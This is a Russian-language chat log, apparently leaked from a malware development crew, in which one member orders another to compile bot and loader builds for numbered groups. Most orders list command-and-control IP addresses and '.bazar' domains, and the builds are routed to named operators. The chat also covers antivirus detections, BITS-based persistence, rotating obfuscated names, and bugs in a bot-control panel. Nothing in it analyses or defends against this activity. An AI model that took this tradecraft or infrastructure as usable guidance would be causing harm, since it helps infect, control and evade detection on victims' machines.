1. Скачай и установи клиент сети Tox (например qTox). Заведи новый профиль под рабочий аккаунт, если еще нет. Пропиши в профиле ник КАК В ЭТОМ РОКЕТЕ. И скинь мне свой Tox ID.
2. В настройках клиента убедись, что соединение осуществляется через сеть Tor.
3. Добавься ко мне в контакты, мой ID: 8201462924F7963A54ABADC532504AED61F6D60DFFF2BE2FC63DD2D41A3FF73C1C6136DFD244
срок - до конца этой недели
подтверди
```
[01.02.22 11:43:22] royal:		Отправил запрос. Работает?
[01.02.22 14:58:04] royal:		Я отошел.
[01.02.22 14:58:13] collin:		+
[02.02.22 07:55:17] collin:		Привет
[02.02.22 07:55:20] collin:		сделай сборку группа 29
[02.02.22 07:55:25] collin:		x64, regsvr32
[02.02.22 07:55:34] collin:		```
адреса (домены) первого этапа
бот:
185.99.132.248
194.40.243.33
23.160.193.217
45.14.226.23

лоадер:
23.160.193.217
45.14.226.23
185.99.132.248
194.40.243.33

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[02.02.22 07:55:37] collin:		направь odis
[02.02.22 08:33:35] collin:		сделай еще сборку группа g15, x64, generic
[02.02.22 08:33:37] collin:		адреса другие:
[02.02.22 08:33:40] collin:		```
адреса (домены) первого этапа
бот:
194.38.20.12
23.160.193.124
5.255.97.185
23.160.193.85

лоадер:
5.255.97.185
23.160.193.85
194.38.20.12
23.160.193.124

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[02.02.22 08:33:43] collin:		направь wild
[02.02.22 13:00:19] collin:		сделай еще сборку группа 23
[02.02.22 13:00:23] collin:		x64, rundll32(svekbdm)
[02.02.22 13:00:30] collin:		```
адреса (домены) первого этапа
бот:
194.38.20.12
23.160.193.124
5.255.97.185
23.160.193.85

лоадер:
5.255.97.185
23.160.193.85
194.38.20.12
23.160.193.124

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[02.02.22 13:00:36] collin:		направь wild
[03.02.22 10:24:47] collin:		Привет!
[03.02.22 10:24:49] collin:		`https://privnote.com/A31Jric2#S48FnpG8Z`
[03.02.22 10:24:55] collin:		подтверди получение и расшифровку
[03.02.22 10:26:39] royal:		Получил.
[03.02.22 10:44:59] royal:		На top browser не воспроизводится.
[03.02.22 10:45:08] royal:		На firefox воспроизводится.
[03.02.22 10:45:35] collin:		ок
[03.02.22 10:46:43] royal:		На firefox в приватном режиме тоже воспроизводится.
[03.02.22 10:51:34] royal:		На vivaldi browser (на движке хром) не воспроизводится.
[03.02.22 10:53:22] royal:		В приватном окне тоже не воспроизводится.
[03.02.22 10:53:41] royal:		Только firefox последней версии у меня воспроизводится.
[03.02.22 10:53:50] collin:		ок спс
[03.02.22 10:55:54] collin:		на windows это все?
[03.02.22 10:56:01] royal:		Да.
[03.02.22 10:57:12] royal:		Windows 10 Домашняя для одного языка 19044.1466
[03.02.22 11:12:35] collin:		сделай сборки:
[03.02.22 11:12:46] collin:		16 generic
16 rundll32(switchbsmode)
[03.02.22 11:12:48] collin:		x64
[03.02.22 11:12:59] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.156
109.230.199.106
185.158.251.101
194.76.227.89

лоадер:
194.76.227.89
109.230.199.106
185.158.251.101
45.41.204.156

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[03.02.22 11:13:01] collin:		направь odis
[03.02.22 11:16:52] collin:		и еще сделай сборку x64 группа 57, rundll32(djkfdld4s)
[03.02.22 11:16:55] collin:		направь wild
[03.02.22 11:16:58] collin:		адреса те же
[03.02.22 15:42:35] collin:		```
https://privatlab.com/s/v/6GyVlM6EW5s2YbL9Gw3O

памятка по информационной безопасности (.gpg файл)
изучи, применяй в работе
```
[03.02.22 15:49:31] royal:		Принял.
[04.02.22 08:09:44] collin:		Привет!
[04.02.22 08:09:48] collin:		сделай сборку
[04.02.22 08:09:50] collin:		группа 29, x64, regsvr32
[04.02.22 08:10:00] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.156
109.230.199.106
185.158.251.101
194.76.227.89

лоадер:
194.76.227.89
109.230.199.106
185.158.251.101
45.41.204.156

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[04.02.22 08:10:03] collin:		направь odis
[04.02.22 09:46:32] collin:		```
-----BEGIN PGP MESSAGE-----

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
3jR4CGLB3UwKfv255LJvduLFH2VE8SuvFX+5rf1ZpKww2Q+Af3T10HDBib6ijkjK
kvvCHee156ItjlqGtSMKDOef8XuMCHgUz2tnxWrFcgl1ERB0WWX4uTaAKGyXmW/T
BA1ASP6PhdbIVbGDl3HIl9wqRHWukD1Nwu4GLe9KW5nq2gcqqWIEusjCtmRveN7d
68oZWyYe6/rYEBgpuWOPxCnY5pEwTPw0RgHZSuZQ1bxeU+ugFJs9DwQASmtqz0bn
Tx6I4qCmqHQhY44FVq1tbfhJ7mgBGikk7tqTnuntc5h+iizj2n0jcwgDWkhXfMYo
NZU+rA9JnNEnlWWMKWvWgMB6oZDlIQE4QeaYSSDLKRrcuNAUtTHQL6r7X3RQo7l1
tMhnTX2KpM9XmaVS9brTL6tcyMdWxGsotdv6du1I/76gVH/PjUBB10qQg0Mi5GHt
gWl0VjBxvGqZTG2fKDT8U7LtMcQsDY9UjXpTl75b8Ql+rVGJkGpqh7/i3wmidaKH
72sbj85XZzOxxc15C4OHISxAqFkzOLvYPB//MFUhC0sMN5+YgN8jUVdQrRdnpSRO
9X8uwqQ6G+GOPHgoDR6VxBKP7zmPxfgh5yGmhpiZM6fjoakCeAxKMScVhA9jFnnK
SuCIaj38ndQiYz8OoKvUN3spOaF7U3DedmF+GQJQvf21VYywvphw+W4N8ozQJzzj
qutyk+lvur2gFerDv4nhmT2BQbNMDDlc5q2ASggQWKBssrOTxl1kc1hI4Y0=
=0fs9
-----END PGP MESSAGE-----

```
[04.02.22 09:46:46] collin:		подтверди задачу
[04.02.22 09:49:04] royal:		Не расшифровывется.
[04.02.22 09:49:58] royal:		Чат нужный знак убирает когда так пишеше.
[04.02.22 09:49:58] collin:		после первой строки поставь перенос, чат коверкает немного
[04.02.22 10:09:14] royal:		Код 500 при запросе бота загрузчиком.
[04.02.22 10:09:50] collin:		по умолчанию там все в черный список идет
[04.02.22 10:10:05] collin:		нужно белые правила добавить, карточка группы - Networks
[04.02.22 10:10:20] collin:		попробуй сам добавить, айпи либо страна, либо все страны
[04.02.22 10:15:48] royal:		Что там никакой кнопки нету чтобы добаввить, только кнопка delete all
[04.02.22 10:16:46] royal:		Надо было на плюс нажать.
[04.02.22 10:20:37] collin:		в префиксе?
[04.02.22 10:20:55] collin:		если нет префиксов то кнопки нет вносимый первым добавится как новый
[04.02.22 10:21:49] royal:		В правилах.
[04.02.22 10:21:53] royal:		Networks
[04.02.22 10:22:15] collin:		кнопка с плюсиком нет?
[04.02.22 10:22:24] royal:		Да.
[04.02.22 10:22:42] royal:		Я ее использовал. Добавил правило. Загрузчик заработал.
[04.02.22 10:23:22] collin:		ок
[04.02.22 10:34:23] royal:		Как там смотреть историю команды?
[04.02.22 10:34:30] royal:		Кнопки нету как на основной.
[04.02.22 10:35:22] collin:		отчет по команде?
[04.02.22 10:35:29] collin:		плюсик справа, у меня есть
[04.02.22 10:36:01] royal:		Справа как на основной столбей Actions
[04.02.22 10:36:09] royal:		На тестовой у меня его вообще нет.
[04.02.22 10:37:03] royal:		У меня последний столбец Status
[04.02.22 10:38:03] royal:		Как я буду проверять результаты команд?
[04.02.22 10:38:40] royal:		Понятно.
[04.02.22 10:38:51] royal:		Не сдвигается интерфейс.
[04.02.22 10:38:57] collin:		там настраиваемая ширина столбцов да
[04.02.22 10:39:07] royal:		Оно там есть если на весь икран сделать браузер.
[04.02.22 10:39:11] collin:		а в реестре ботов она чота не работает пока
[04.02.22 10:39:50] royal:		Прокрутка только до Status докручивает.
[04.02.22 10:40:07] collin:		горизонтальная?
[04.02.22 10:40:14] royal:		Да.
[04.02.22 10:40:29] collin:		а разрешение какое
[04.02.22 10:40:32] collin:		ширина окна
[04.02.22 10:40:49] collin:		попробуй сбрось настройки форм, кеш, куки в браузере
[04.02.22 10:43:33] royal:		У меня ничего не сохраняется в тор браузере.
[04.02.22 10:44:08] collin:		сделай скриншот проблемы, опиши и приложи в отчет
[04.02.22 10:44:38] royal:		И столбыци не изменяют ширину.
[04.02.22 10:44:57] royal:		Мишкой пытаюсь изменить ничего не происходит.
[04.02.22 10:46:33] royal:		Интересная вещь. В развернутом окне изменяется ширина, а в не развернутом нет.
[04.02.22 10:48:33] royal:		Это может быть фишка тор браузера для анонимности может какие данныве не передает, типа разрешения экрана.
[04.02.22 10:50:36] royal:		1a25650db9674df5125d8a536245d2b4
[04.02.22 10:50:58] royal:		Вывод последней команды посмотри.
[04.02.22 10:51:29] royal:		Так должно быть? Никакого оформления, как бубто в одну строку без переносов все записано.
[04.02.22 10:52:02] royal:		Тестовая.
[04.02.22 10:56:08] collin:		отпечатка в истории может глючить с форматом
[04.02.22 10:56:24] collin:		а вот целиковый отчет по кнопке не скачивается, это серьезннее баг
[04.02.22 11:30:11] royal:		Там переносов нету я так понял нигде в строках, у команды run exe так же водну строку все. Программа выводит с переносом, это точно.
[04.02.22 11:31:23] collin:		понятно, ну это не критично
[04.02.22 11:32:04] royal:		Тот кто будет читать вывод сойдет с ума, если он большой будет.
[04.02.22 15:00:31] royal:		По тестам. По протоколу вопросов нет. Все команды приходят как надо и работают. Баги только в веб интерфейсе, о которых писал выше.
[04.02.22 15:01:06] collin:		ок
[04.02.22 15:01:30] collin:		с выравниванием в отчете по runexe так и остался баг?
[04.02.22 15:02:09] royal:		Та везде этот баг кроме команды rundll.
[04.02.22 15:02:37] royal:		run exe, run bat, run powershell, system info bat
[04.02.22 15:03:00] royal:		Что странно, я думал они все одинаково обрабатываются.
[04.02.22 15:03:05] collin:		насчет ширины таблицы в истории, у меня не проявляется
[04.02.22 15:03:30] collin:		так что напиши какая ОС и браузер и сформулируй проблему еще раз
[04.02.22 15:12:25] royal:		Tor Browser 11.0.4 (based on Mozilla Firefox 91.5.0esr) (64 бита)
Windows 10 Домашняя для одного языка 19044.1466
Разрешение экрана 5120x2880

Запускаем Tor Browser, делаем его не развернутым на весь экран, переходим в Test Bots. Видим таблицу с ботами, она не влезает в окно по ширине, мышкой прокручиваем ее вправо, максимум до куда она прокручивается это до правого края столбца Status. При попытке изменить размер столбца какого либо мышкой, ширина стобца не меняется.

А если развернуть окно Tor Browser на весь экран, то вся таблица с ботами помещается в окне, ширина столбцов изменяется с помощью мишы.
[04.02.22 15:15:00] royal:		У меня есть предположение что это Tor Browser. У меня тут много элементов криво выровнено в режиме когда окно не развернуто на всемь экран.
[04.02.22 15:18:41] royal:		Я ушел.
[04.02.22 15:20:11] collin:		+
[07.02.22 07:15:06] collin:		привет!
[07.02.22 07:15:12] collin:		сделай новую сборку
[07.02.22 07:15:19] collin:		группа 23, x64, generic
[07.02.22 07:15:23] collin:		```
адреса (домены) первого этапа
бот:
198.252.108.16
84.32.188.136
5.182.207.28
80.71.158.42

лоадер:
5.182.207.28
80.71.158.42
198.252.108.16
84.32.188.136

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.02.22 07:15:26] collin:		направь wild
[07.02.22 08:45:11] collin:		сделай еще сборку группа 16, x64, generic
[07.02.22 08:45:20] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.158
23.160.193.223
192.119.162.97
193.235.207.181

лоадер:
192.119.162.97
193.235.207.181
45.41.204.158
23.160.193.223

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.02.22 08:45:29] collin:		направь odis
[07.02.22 11:47:42] collin:		сделай еще сборку
[07.02.22 11:47:44] collin:		g15, x64, rundll32(vspa)
[07.02.22 11:48:54] collin:		погоди g15 пока не надо
[07.02.22 11:48:57] collin:		адреса сдохли
[07.02.22 11:56:07] collin:		всетаки сделай новую сборку
[07.02.22 11:56:15] collin:		группа g15, x64, rundll32(vspa)
[07.02.22 11:56:21] collin:		```
адреса (домены) первого этапа
бот:
198.252.108.16
84.32.188.136
5.182.207.28
80.71.158.42

лоадер:
5.182.207.28
80.71.158.42
198.252.108.16
84.32.188.136

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.02.22 11:56:24] collin:		направь wild
[07.02.22 13:06:17] collin:		сделай еще сборку
[07.02.22 13:06:27] collin:		группа 29 regsvr32, x64
[07.02.22 13:06:39] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.158
23.160.193.223
192.119.162.97
193.235.207.181

лоадер:
192.119.162.97
193.235.207.181
45.41.204.158
23.160.193.223

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.02.22 13:06:42] collin:		направь odis
[08.02.22 08:10:46] collin:		Привет!
[08.02.22 08:10:49] collin:		сделай сборку
[08.02.22 08:10:53] collin:		группа g15 rundll32(cvebin)
[08.02.22 08:11:05] collin:		```
адреса (домены) первого этапа
бот:
5.2.70.80
103.208.86.101
103.208.86.112
194.76.227.98

лоадер:
103.208.86.112
194.76.227.98
5.2.70.80
103.208.86.101

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[08.02.22 08:11:08] collin:		направь wild
[08.02.22 08:12:17] collin:		Франц ЗП выдает в жабе
[08.02.22 13:51:35] royal:		Я отошел.
[08.02.22 13:51:52] collin:		+
[09.02.22 09:42:49] collin:		привет!
[09.02.22 09:42:58] collin:		сделай сборку группа g13 generic
[09.02.22 09:43:06] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.23
23.160.193.9
45.41.204.143
23.160.193.190

лоадер:
45.41.204.143
23.160.193.9
45.41.204.23
23.160.193.190

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[09.02.22 09:43:09] collin:		направь nick
[09.02.22 14:29:35] royal:		Я отшел.
[09.02.22 14:30:24] collin:		+
[10.02.22 08:03:17] collin:		Привет!
[10.02.22 08:03:25] collin:		добавил новые таски в редмайне 853, 857
[10.02.22 08:03:46] collin:		делай их следующими по очереди
[10.02.22 08:39:59] collin:		сделай сборки новые:
[10.02.22 08:40:03] collin:		g15 rundll32(lfwcr)
23 rundll32(msuspend)
[10.02.22 08:40:15] collin:		```
адреса (домены) первого этапа
бот:
5.2.70.80
103.208.86.101
103.208.86.112
194.76.227.98

лоадер:
103.208.86.112
194.76.227.98
5.2.70.80
103.208.86.101

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[10.02.22 08:40:20] collin:		направь wild
[11.02.22 08:06:19] collin:		Привет!
[11.02.22 08:06:23] collin:		сделай сборку g15 generic
[11.02.22 08:06:27] collin:		```
адреса (домены) первого этапа
бот:
5.2.70.80
103.208.86.101
103.208.86.112
194.76.227.98

лоадер:
103.208.86.112
194.76.227.98
5.2.70.80
103.208.86.101

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[11.02.22 08:06:31] collin:		направь wild
[11.02.22 11:08:28] collin:		сделай сборку
[11.02.22 11:08:31] collin:		группа 16 rundll32(savereport)
[11.02.22 11:08:49] collin:		```
адреса (домены) первого этапа
бот и лоадер:
45.128.149.42
137.74.104.103
5.2.67.108
80.92.204.176

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[11.02.22 11:08:55] collin:		скинь мне
[11.02.22 11:51:40] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/+O6gt9jJRPzY62d85YuAhTf8Jg++9u/DAmnFAkYf6R4kY
5yJsZYy9CmsmX1LsDu566a8u4hu99xnZSvxTPz+nlyrVO+snkgwrUb3TL0XzpLMQ
cqrXS7XuDUxbAZko7PkkwFQU4cDEfmoZ1skegcKCHYpGaQZRzwhLIIKGXBulXJSD
gsJeUbbfuHLrqwtSCtxuf3Waq9XblxU7No2AaHZvypmuKCW8RIOWhMg7u9RgaGTW
816hpT29s2THaff/PuCF/cdn1wgapUIFpjOKd5mcXxMAhJq58Q9vBAswSLVUbgsF
raai/GLZ2Eif6JASJzFhuOmgCt25koEnT0J+hiw7Gi4GD5SDlp/nAJg8VfauIiXV
NgOBakGF5waRGJqswkqOD6nixvgRIZTmSaIaR0VLcs3AhZftGVvIW6KNg5F+vmJU
SffpKZdY5xO/nM5R5oliB2t2esNPEl0dErH/KXfs2KEjwIIjCn1oz3OsCrd2i2QV
4W1DfsXKjPM1eDs0z/6KpWHSHEOcBnXRXYOLpczuT3Ll94NDiKmCeHIqCWYTsIBQ
U1cebz8of1ccGyxMk3+VYKq8JTxpGnHHc3dq5s5rYvMxUoWjSeXW+QXkjq0TbH4E
4N+n+Dc9x5xHRKXO93Eca2K0FKpB+wtQvWdsmq8RQGgt45udS4OThDeDdphga+TS
wAsB9qEaPMeAdOupWX4S5bcYEo0oA2eRcJ/qK2KnnoRYoPUq5lg6cadkOUrmUCFA
khgR00o/HhDf0xLIX5+6An2UVHfAnxUW8+LyIrurIvr/IM0VwdgoZG64QVgQgMxc
acJFmZvQsZUWu+GuAWt70OnRc1+quIKCxE0EPFDoi/EKbTaPFFXlAGAj/wHBDSr2
JZ5g4Av0CUkzgJc2KlsdAxZa0AIKlr5VheAhZIhkxlVEDlnfqQX1bnvoy3nE9V5E
vuEw3WgMGdqEWmw7EQ==
=G1QE
-----END PGP MESSAGE-----
[11.02.22 11:51:44] royal:		1 детект.
[11.02.22 11:53:29] collin:		`void savereport()` что значит?
[11.02.22 11:54:31] royal:		Функция для запуска
[11.02.22 11:54:53] collin:		`int __stdcall savereport(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow)`
[11.02.22 11:55:01] collin:		такая ведь у нее спека?
[11.02.22 11:55:08] royal:		Нет.
[11.02.22 11:55:14] collin:		почему?
[11.02.22 11:55:51] royal:		А почему такая должна быть?
[11.02.22 11:56:00] royal:		Никогда такую не делал.
[11.02.22 12:03:16] royal:		"Пояснение по профилям"
[11.02.22 12:03:55] collin:		`регламент сопровождения сборок БК (для кодеров).txt` август 2021, есть такой?
[11.02.22 12:04:38] royal:		Есть такой.
[11.02.22 12:06:27] royal:		У меня такое есть "формат точки входа в нагрузку оговаривается заранее и указывается при передаче сборки на тестирование"
[11.02.22 12:07:18] royal:		Такое есть "extern "C" __declspec(dllexport) int __stdcall ExportFunction();"
[11.02.22 12:08:06] royal:		Такое есть "int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);"
[11.02.22 12:08:15] royal:		Три разные функции.
[11.02.22 12:09:03] royal:		Все rundll32 что я делал были как "void func()".
[11.02.22 12:09:29] royal:		И никто не заметил что это не правильно до сих пор получается.
[11.02.22 12:33:33] royal:		Замена.
[11.02.22 12:33:34] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//fAWUZFqba5Ebr1eiaSrJCZpnW3CKqgSeAfiX4ftZRQ4U
Dm6mUU65G7tD/cT+9Z6cxLvYxcKKNkwx3DwsUWN8ps0q+v7RMvGXciKcwSmoAyeQ
Gpj0i++CtTopmAeZPzmkKp205bShMhwxCVXrKZB7X3Fr/XPvS8m1NKDRmskhyybx
8XoZALEQbsgzTsxbd2CPEPgDb3fCGk7snYpcIW7tQjInkhbb6Cnm5FFSA9Xfscl2
zKEMtr3NfI55qBvVjBUgt0u6Nh4BSFm31l2GHJfy4s69AYo9ZTCoCcDXZmC8xdwg
uhH2DYc28bzVtp9Vuw+6k8vsIOWsnrzmH8xUEQKQHbHnWv8nv5XpizwTBK7vSFk5
SPMqlZVOY0t+CfsKLvDhrlq/YXZGn8byljvSverldT69nOXjXyxgwFh6xqOBU+hy
ZQCUf5L9oOnUZ+usCJVYpVmmsCqHbdqPVtgcM8iR17MQ6zqvoDzh/oDXeHjfwq8L
Fwgrna1VhJCEGOKrxR6p6QZ+DH8b8e+u6orL7pfRg3Bm1fJq2G5Kd8Wr2mRzzqTH
W+hdrnwjyTP3ynRwtvCcKVuIakpu43hdE7rACWnFZ/wYnDM705Ekhifso8yRlmhB
n9YCfnUiR7jwFDZJVlsH6SWLsWXQhbPkD14Bz3XGit5quxDNF9jYsELueNav/KfS
wDEB1u2NlllKr6A51gd9cqrLeQ6LBLxxI/cJ6H9t12E1sImNFgnSJotY8DqRdv1E
0VSVBY6QlCXv1OBFfq+q59eTXPKOobwpQ3SaHlW6j2LNr4p3KzTlT7qrSRHnLVAe
KJiIXDLavkMzrtwdiKoWrsQkSnMLFRUeiEnzLMKqBwVJ3QHRUABY0WQGELxCrLqS
IsFGS6CX0jvw64MVZfxzI9oGuhhLQW6lnOnXSw6GJx5qxbj8rasbhVVggorU4e2U
kTnd6WY/sJ5S561fnWnbjcBiOtx/i1G92TzWb3JF4V9+0g1OYHltivxJuInoSbWu
R8H6
=NcPO
-----END PGP MESSAGE-----
[11.02.22 12:34:46] collin:		+
[11.02.22 12:35:58] royal:		Скажи что работает, и я закрою задачу в redmine.
[11.02.22 12:43:57] collin:		один крипт работает, сейчас еще проверяю
[11.02.22 12:44:30] royal:		Так они и раньше работали все получается когда было void func().
[11.02.22 12:56:28] collin:		как часто у тебя статические названия меняются?
[11.02.22 12:56:53] collin:		имя задачи bits, ссылка в ней, параметр для запуска лоадера из bits, параметр при запуске бота в процессе svchost.exe
[11.02.22 13:16:08] royal:		Параметр для запуска лоадера и bits всегда разный, его система генерирует. Все остальное давно не менял. Они все обфусцированны.
[11.02.22 13:17:53] collin:		я в свое время делал опросник, там был пункт про статические имена в системе, почти все сказали что нет и ты тоже. Кто сказал есть - я давал таск исправить ситуацию
[11.02.22 13:18:21] collin:		добавлю таск тогда позднее, скажу что делать
[11.02.22 13:19:18] royal:		Статические имена есть, типа GUID меняется при каждый день. Не енял только ссылку bits.
[11.02.22 13:19:47] royal:		Я не говорил что нет.
[11.02.22 13:21:24] collin:		я не говорил что их менять надо минимум раз внеделю?
[11.02.22 13:21:59] royal:		Ты говорил надо менять user-agent.
[11.02.22 13:22:34] collin:		ок
[11.02.22 14:12:42] royal:		Что там по работоспособности?
[11.02.22 14:12:51] royal:		Закрываю задачу?
[11.02.22 14:12:56] collin:		да крипты работают
[11.02.22 14:18:03] royal:		Вопрос по 857.
1 - "General info": данные в параметрах os, arch, cname, uname, locale, tz, group
[11.02.22 14:18:14] royal:		Параметра group нету в system info.
[11.02.22 14:18:21] collin:		должен быть
[11.02.22 14:18:24] royal:		Я что то упустил?
[11.02.22 14:18:34] collin:		наименование группы сборки
[11.02.22 14:19:04] collin:		```
5.1. Ответ на команду 1 с информацией о системе
Тело POST-запроса отправляется в упаковке form/urlencoded, со следующими полями:
group=%имя группы%
```
[11.02.22 14:19:10] collin:		это из самого первого ТЗ на бот
[11.02.22 14:19:48] royal:		Оно преписывалось сто раз это задание.
[11.02.22 14:19:58] royal:		Значит я это упустил.
[11.02.22 14:29:49] royal:		В задании не указан пункт domain.
[11.02.22 14:30:08] royal:		Это рабочая группа.
[11.02.22 14:30:20] royal:		Типа WorkGroup.
[11.02.22 14:33:34] collin:		domain - в флаг 1 "Gemeral Info", поправил
[11.02.22 15:21:00] royal:		Видел бота 8e58bb7018899a06359d20ace7583afa
[11.02.22 15:21:18] royal:		Там hoststname 054313581853
[11.02.22 15:21:23] royal:		Это нормально?
[11.02.22 15:22:59] collin:		не знаю корп какойто
[11.02.22 15:23:10] collin:		значит имя домена/субдомена
[11.02.22 15:23:18] royal:		А что такие имена бывают как номер?
[11.02.22 15:23:18] collin:		ой нет
[11.02.22 15:23:25] collin:		имя хоста же
[11.02.22 15:23:38] collin:		думаешь винда такое не допускает создавать?
[11.02.22 15:24:05] royal:		Может допускает. Я первый раз вижу такое имя.
[11.02.22 15:28:38] royal:		Допускается. Nine Millions of Domain Names Are “Just Numbers” пишут.
[14.02.22 08:05:34] collin:		привет!
[14.02.22 08:05:45] collin:		у тебя в логированной сборке лоадера какое время пишется
[14.02.22 08:05:49] collin:		локальное или UTC
[14.02.22 08:06:15] collin:		т.е. `2/13/2022 10:45:55 PM Started` это в UTC?
[14.02.22 08:08:40] royal:		То которое на компьютере стоит.
[14.02.22 08:09:03] royal:		Чтобы не парится ни скаким переводом времени.
[14.02.22 08:17:04] collin:		`https://file.io/z5PZy9P1fXmi`
[14.02.22 08:17:22] collin:		смотри пятничная сборка гр. 16 бот падает на тестовой ВМ на нашем proxmox
[14.02.22 08:17:26] collin:		на других работает норм
[14.02.22 08:17:38] collin:		падает при обработке команды 1 SystemInfo, тут лог бота
[14.02.22 08:17:51] collin:		надо отладить и поправить, доступ на машину могу дать
[14.02.22 08:17:55] collin:		где такая штука
[14.02.22 08:21:22] collin:		второй момент - не стучат лоадеры на win7, 8, 8.1. А боты норм
[14.02.22 08:21:25] collin:		```
